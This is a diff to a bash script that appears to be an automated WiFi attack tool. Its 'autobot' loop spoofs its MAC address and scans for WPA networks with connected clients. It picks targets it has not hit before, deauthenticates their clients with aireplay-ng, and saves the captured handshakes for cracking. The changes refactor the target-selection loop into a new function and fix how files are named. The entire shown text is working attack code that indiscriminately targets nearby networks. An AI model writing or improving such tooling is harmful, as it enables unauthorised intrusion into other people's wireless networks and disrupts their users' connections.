@@ -18,6 +18,7 @@ fautobot()																#Automagically find active clients and collect new han
 	ifconfig mon0 down
 	macchanger -a mon0
 	ifconfig mon0 up
+	sleep 1
 	clear
 	$COLOR 2;$COLOR2 1;echo " [>] AUTOBOT ENGAGED [<] ";$COLOR 9;$COLOR2 9
 	echo
@@ -28,53 +29,11 @@ fautobot()																#Automagically find active clients and collect new han
 	echo " [*] BSSID: $BSSID"
 	echo " [*] CLIENT: $CLIE"
 	echo " [*] CHANNEL: $CHAN";$COLOR2 9
-	gnome-terminal --geometry=130x20+0+320 -x airodump-ng mon0 -f 750 -a -w $HOME/tmp -o csv --encrypt WPA&
+	gnome-terminal --geometry=130x50+0+320 -x airodump-ng mon0 -f 750 -a -w $HOME/tmp -o csv --encrypt WPA&
 	DONE=""
 	LNUM=0
 	sleep 5
-	while [ $DONE -z ] 2> /dev/null
-		do
-			sleep 0.3
-			echo "$(cat $HOME/tmp-01.csv | grep 'Station' -A 20 | grep ':' | cut -d ',' -f 6)" > $HOME/tmp3
-			cat $HOME/tmp3 | tr -d '(not associated)' | sed '/^$/d' | sort -u > $HOME/tmp2
-			BSSIDL=$(cat $HOME/tmp2 | sort -R | head -n 1)
-			if [ $(cat $HOME/Desktop/cap/handshakes/got | grep $BSSIDL) -z ] 2> /dev/null
-				then
-					BSSID=$BSSIDL
-			fi						
-			ESSID=$(cat $HOME/tmp-01.csv | grep "$BSSID" | grep "WPA" | cut -d ',' -f 14 | head -n 1)
-			ESSID=${ESSID:1}
-			CHAN=$(cat $HOME/tmp-01.csv | grep "$BSSID" | grep "WPA" | cut -d ',' -f 4 | head -n 1)
-			CHAN=$((CHAN + 1 - 1))
-			CLIE=$(cat $HOME/tmp-01.csv | grep 'Station' -A 20 | grep "$BSSID" | cut -d ',' -f 1 | head -n 1)
-			clear
-			$COLOR 2;$COLOR2 1;echo " [>] AUTOBOT ENGAGED [<] ";$COLOR 9;$COLOR2 9
-			echo
-			$COLOR 4;echo " [*] Scanning for active clients.. ";$COLOR 9
-			echo
-			$COLOR 1;echo " [>] EVALUATING TARGET: ";$COLOR 9
-			$COLOR2 1;echo " [*] ESSID: $ESSID"
-			echo " [*] BSSID: $BSSID"
-			echo " [*] CLIENT: $CLIE"
-			echo " [*] CHANNEL: $CHAN";$COLOR2 9
-			if [ ${BSSID:2:1} = ":" ] 2> /dev/null
-				then
-					if [ $(cat $HOME/Desktop/cap/handshakes/got | grep $BSSID) -z ] 2> /dev/null
-						then
-							DONE=1
-						else
-							DONE=""
-					fi
-					if [ $ESSID -z ] 2> /dev/null
-						then
-							DONE=""
-					fi
-			fi
-			if [ $CLIE -z ] 2>/dev/null
-				then
-					DONE=""
-			fi
-		done
+	fhunt
 	killall airodump-ng
 	rm -rf $HOME/tmp*
 	gnome-terminal --geometry=130x20+0+320 -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w $HOME/tmp1&
@@ -86,6 +45,7 @@ fautobot()																#Automagically find active clients and collect new han
 			$COLOR 2;$COLOR2 1;echo " [>] AUTOBOT ENGAGED [<] ";$COLOR 9;$COLOR2 9
 			$COLOR 4;$COLOR2 3; echo " [*] TARGET $ESSID LOADED [*] ";$COLOR 9;$COLOR2 9
 			echo
+			sleep 1
 			$COLOR 2;$COLOR2 1; echo " [*] DEAUTHING $CLIE ";$COLOR 9;$COLOR2 9
 			$COLOR 1;aireplay-ng -0 2 -a $BSSID -c $CLIE mon0;$COLOR 9
 			echo
@@ -111,30 +71,75 @@ fautobot()																#Automagically find active clients and collect new han
 			fi
 			done
 	clear
-	$COLOR 2;$COLOR2 1;echo " [*] Handshake capture was successful!, Horray for AUTOBOT! ";$COLOR 9;$COLOR2 9
-	$COLOR 4;echo $DONE;$COLOR 9
-	$COLOR 2;echo " [*] Handshake saved to $HOME/Desktop/cap/handshakes/$ESSID-$DATE".cap "";$COLOR 9
+	$COLOR 2;$COLOR2 1;echo " [*] Handshake capture was successful!, Horray for AUTOBOT! [*] ";$COLOR 9;$COLOR2 9
+	echo
+ 	$COLOR 2;echo " [*] Handshake saved to $HOME/Desktop/cap/handshakes/$ESSID-$DATE [*] ".cap "";$COLOR 9
 	echo
 	$COLOR 2;$COLOR2 1;echo " [>] AUTOBOT WILL RESUME IN 3 SECONDS [<] ";$COLOR 9;$COLOR2 9
 	GDONE=""
 	DONE=""
 	killall airodump-ng
-	clear
 	echo "$BSSID" >> $HOME/Desktop/cap/handshakes/got
 	DATE=$( date +%Y_%m_%d_%H%M%S )
-	pyrit -r $HOME/tmp1-01.cap -o $HOME/Desktop/cap/handshakes/$ESSID-$DATE".cap" strip | grep 'New pcap-file'
+	ESSID=$(echo "$ESSID" | sed 's/ /_/g')
+	pyrit -r $HOME/tmp1-01.cap -o "$HOME/Desktop/cap/handshakes/$ESSID-$DATE.cap" strip | grep 'New pcap-file'
 	rm -rf $HOME/tmp*
 	sleep 3
 	fautobot
 }		
 
-fanalyze()
+fhunt()																	#find active clients that havn't been handshaked yet for autobot
+{
+	DONET=""
+	while [ $DONET -z ] 2>/dev/null
+		do
+			sleep 0.2
+			BSSIDL="$(cat $HOME/tmp-01.csv | grep 'Station' -A 20 | grep ':' | cut -d ',' -f 6 | tr -d '(not associated)' | sed '/^$/d' | sort -uR | head -n 1)"
+			if [ $(cat $HOME/Desktop/cap/handshakes/got | grep $BSSIDL) -z ] 2> /dev/null
+				then
+					BSSID=$BSSIDL
+					DONET=1
+				else
+					DONET=""
+			fi
+			
+			ESSID=$(cat $HOME/tmp-01.csv | grep "$BSSID" | grep "WPA" | cut -d ',' -f 14 | head -n 1)
+			ESSID=${ESSID:1}
+			CHAN=$(cat $HOME/tmp-01.csv | grep "$BSSID" | grep "WPA" | cut -d ',' -f 4 | head -n 1)
+			CHAN=$((CHAN + 1 - 1))
+			CLIE=$(cat $HOME/tmp-01.csv | grep 'Station' -A 20 | grep "$BSSID" | cut -d ',' -f 1 | head -n 1)
+			clear
+			$COLOR 2;$COLOR2 1;echo " [>] AUTOBOT ENGAGED [<] ";$COLOR 9;$COLOR2 9
+			echo
+			$COLOR 4;echo " [*] Scanning for active clients.. ";$COLOR 9
+			echo
+			$COLOR 1;echo " [>] EVALUATING TARGET: ";$COLOR 9
+			$COLOR2 1;echo " [*] ESSID: $ESSID"
+			echo " [*] BSSID: $BSSID"
+			echo " [*] CLIENT: $CLIE"
+			echo " [*] CHANNEL: $CHAN";$COLOR2 9
+			if [ $BSSID -z ] 2> /dev/null
+				then
+					DONET=""
+			fi
+			if [ $ESSID -z ] 2> /dev/null
+				then
+					DONET=""
+			fi
+			if [ $CLIE -z ] 2>/dev/null
+				then
+					DONET=""
+			fi
+		done
+}
+
+fanalyze()																#Analyze handshakes
 {
 	
 	while [ $(echo $ISDONE | grep $BSSID) -z ] 2> /dev/null
 		do
 			sleep 0.5
-			ISDONE=$(pyrit -r $HOME/tmp1-01.cap analyze)
+			ISDONE=$(pyrit -r $HOME/tmp1-01.cap analyze 3> /dev/null)
 			if  [ $(echo $ISDONE | grep "$ESSID") -z ] 2> /dev/null
 				then
 					A=1
@@ -341,6 +346,7 @@ fcap()																	#Deauth, capture and strip handshakes
 	fi
 	$COLOR 4;echo " [*] Saving and stripping handshake, please wait... [*] ";$COLOR 9
 	DATE=$( date +%Y_%m_%d_%H%M%S )
+	ESSID=$(echo "$ESSID" | sed 's/ /_/g')
 	pyrit -r $HOME/tmp1-01.cap -o $HOME/Desktop/cap/handshakes/$ESSID-$DATE".cap" strip | grep 'New pcap-file'
 	airmon-ng stop mon0
 	rm -rf $HOME/tmp*
